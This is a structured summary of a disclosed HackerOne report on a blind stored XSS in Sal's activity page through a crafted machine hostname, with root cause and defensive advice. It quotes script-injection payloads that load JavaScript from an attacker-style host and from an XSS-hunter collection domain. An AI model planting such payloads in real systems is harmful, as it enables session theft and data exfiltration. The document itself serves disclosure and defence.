# Blind Stored XSS in HackerOne's Sal 4.1.4.2149 via Hostname

## Metadata
- **Source:** HackerOne
- **Report:** 995995 | https://hackerone.com/reports/995995
- **Submitted:** 2020-10-01
- **Reporter:** nahamsec
- **Program:** HackerOne
- **Bounty:** Not specified in report
- **Severity:** high
- **Vuln:** Stored Cross-Site Scripting (XSS), Improper Input Validation, Insufficient Output Encoding
- **CVEs:** CVE-2020-26205
- **Category:** web-api

## Summary
A blind stored XSS vulnerability exists in Sal 4.1.4.2149 where user-supplied hostname data is stored and reflected without proper sanitization on the Activity page. An attacker can set their machine hostname to an XSS payload, which executes when other users view the activity log page containing the compromised entry.

## Attack scenario
1. Attacker gains control of a machine monitored by Sal and changes its hostname to a malicious JavaScript payload (e.g., '"><script src="https://attacker.com/malicious.js"></script>)
2. The hostname is submitted to Sal's backend system and stored in the database without validation or encoding
3. Other authorized users browse the Activity page at /list/Activity/hour/all/0/ which displays recent machine activities
4. The stored XSS payload in the hostname field is rendered in HTML without output encoding in a table cell
5. The JavaScript payload executes in the victim's browser with their session privileges and CSRF token
6. Attacker can steal session cookies, perform actions on behalf of the victim, or exfiltrate sensitive data

## Root cause
The application fails to properly sanitize and encode hostname data received from monitored machines before storing and displaying it in HTML context. No Content Security Policy (CSP) is implemented to restrict script execution. The output encoding is missing when rendering machine hostnames in the activity table.

## Attacker mindset
An attacker with machine registration/management capabilities (such as a compromised endpoint or rogue admin) can plant persistent XSS payloads in machine metadata. Since Sal displays this data to all users viewing activity logs, the attack reaches all monitoring staff, making it a high-impact persistence mechanism for lateral movement or credential harvesting within the organization.

## Defensive takeaways
- Implement strict input validation for hostname fields using whitelist patterns (alphanumeric, hyphens, dots only)
- Apply context-appropriate output encoding (HTML entity encoding) when rendering hostnames in HTML context
- Utilize a templating engine with auto-escaping enabled (e.g., Jinja2 with autoescape) to prevent XSS
- Deploy Content Security Policy (CSP) headers to restrict inline script execution and external script sources
- Validate and sanitize all data received from monitored endpoints, treating them as untrusted input
- Implement HTTPOnly and Secure flags on all sensitive cookies to limit token theft impact
- Conduct regular security audits of data flow from endpoints to dashboards
- Use a security-focused HTML sanitization library if HTML formatting is required in hostnames

## Variant hunting
Check other machine-related fields (OS version, IP address, hardware info) for similar stored XSS
Inspect other activity log pages and reports that display machine metadata
Test other monitoring dashboards that consume endpoint-supplied data for output encoding gaps
Review API endpoints that accept machine data to see if client-side filtering is relied upon instead of server-side validation
Look for similar patterns in other HackerOne infrastructure tools that aggregate endpoint data
Test if other metadata fields from machines (usernames, file paths, process names) are similarly vulnerable

## MITRE ATT&CK
- T1190
- T1059
- T1133
- T1087

## Notes
This is a blind stored XSS because the payload doesn't execute for the attacker submitting it, but only when viewed by other users. The hostname source is especially insidious because it comes from trusted infrastructure (monitored machines) but can be controlled by attackers who compromise those machines or their registration process. The report includes actual proof-of-concept HTML source showing the unencoded script tag in the table cell, making this a clear vulnerability confirmation.

## Full report
<details><summary>Expand</summary>

The page located at `https://sal.██████.com/list/Activity/hour/all/0/` suffers from a Cross-site Scripting (XSS) vulnerability when a user has set their hostname on their machine to an XSS payload. 

##### Vulnerable Page
`https://sal.██████.com/list/Activity/hour/all/0/`

##### Victim IP Address
`███████`

##### Referer
`https://sal.██████.com/`

##### User Agent
`Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.121 Safari/537.36`

##### Cookies (Non-HTTPOnly)
`_ga=████████; _mkto_trk=id:███&token:_mch-█████.com-██████; _biz_uid=████████; _biz_nA=2; _biz_flagsA=%7B%22Version%22%3A1%2C%22Mkto%22%3A%221%22%7D; _biz_pendingA=%5B%5D; csrftoken=█████`

#### Source

```
><td><a href="/machine_detail/28/">███</a></td><td>██████████</td><td class="sorting_1">2020-10-01 06:51 BST</td></tr><tr role="row" class="odd"><td><a href="/machine_detail/17/">███████</a></td><td>██████</td><td class="sorting_1">2020-10-01 06:50 BST</td></tr><tr role="row" class="even"><td><a href="/machine_detail/41/">"&gt;<script src="https://nahamsec.xss.ht"></script></a></td><td>bensdp</td><td class="sorting_1">2020-10-01 06:49 BST</td></tr></tbody></table></div></div><div class="row"><div class="col-sm-5"><div class="dataTables_info" id="test_info" role="status" aria-live="polite">██████</div></div><div class="col-sm-7">
```


Thanks,
Ben

## Impact

#

</details>

---
*Analysed by Claude on 2026-05-12*
